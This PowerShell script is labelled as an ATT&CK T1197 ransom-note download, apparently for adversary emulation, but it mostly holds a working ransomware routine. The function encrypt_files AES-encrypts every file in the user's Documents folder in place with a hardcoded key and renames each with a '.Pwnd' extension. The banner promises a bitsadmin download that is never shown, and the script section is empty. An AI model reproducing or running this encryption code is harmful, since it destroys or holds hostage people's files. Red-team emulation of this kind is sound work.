# Donwload Ransom Note and stores it on User's Desktop 
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload RansomWare Note using Bitsadmin (T1197)"
Write-Output "==============================================================================="
################ [ VARIABLES ] ################
$DirectoryPath  = "$env:USERPROFILE\Documents";
$FilesMgmt      = "$env:PUBLIC\exf\Files_mgmt.txt";
$EncryptionKey  = "Encrypt!on-K3y"
$NewExtension   = "Pwnd"

function encrypt_files {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DirectoryPath
        #    [string]$OutputFile = "hashes.txt"
    )

    # Check if directory exists
    if (-not (Test-Path $DirectoryPath)) {
        Write-Host "Directory can not be find." 
        exit
    }

$sha256 = [System.Security.Cryptography.SHA256]::create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($EncryptionKey));

#Creation  AES Object
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Key = $key
$aes.GenerateIV()
$iv = $aes.IV

foreach ($file in Get-ChildItem $DirectoryPath)
{
    $FileName=$file.FullName;
    $FileCheckSum = Get-FileHash -Path $FileName -Algorithm SHA256
    Get-Content -Path $FileName -TotalCount 1 | Out-null;
    $NewFileName=$FileName+"."+$NewExtension
    Rename-Item -Path $file.FullName -NewName $NewFileName;
    # Read File content
    $PlainBytes = [System.IO.file]::ReadAllBytes($NewFileName);
   
#    $PlainBytes = [System.IO.file]::ReadAllBytes($FileName);
    # Create Encryptor
    $Encryptor = $aes.CreateEncryptor()
    # Encrypt Data
    $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
    # Merge IV + Encrypted Data
    $FinalBytes = $iv + $EncryptedBytes
    # Write Encrypted File
    [System.IO.File]::WriteAllBytes($NewFileName,$FinalBytes)
    Write-host "Original filename             : " $FileName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host "Original File SHA256 checksum : " $($FileCheckSum.Hash)  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host "Encrypted Filename            : " $NewFileName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host ""
}
}

function remove_double_extension {
$MatchEndingExtension = "\."+$NewExtension+"$"

$files = Get-ChildItem -Path $DirectoryPath -File | Where-Object { $_.Name -match $MatchEndingExtension }

foreach ($file in $files) {
    $newName = $file.Name -replace $MatchEndingExtension, ''
    $newPath = Join-Path $file.DirectoryName $newName
    Rename-Item -Path $file.FullName -NewName $newPath
    Write-Host "Renamed file : $($file.Name) -> $newName"
}
}

################ [ SCRIPT ] ################
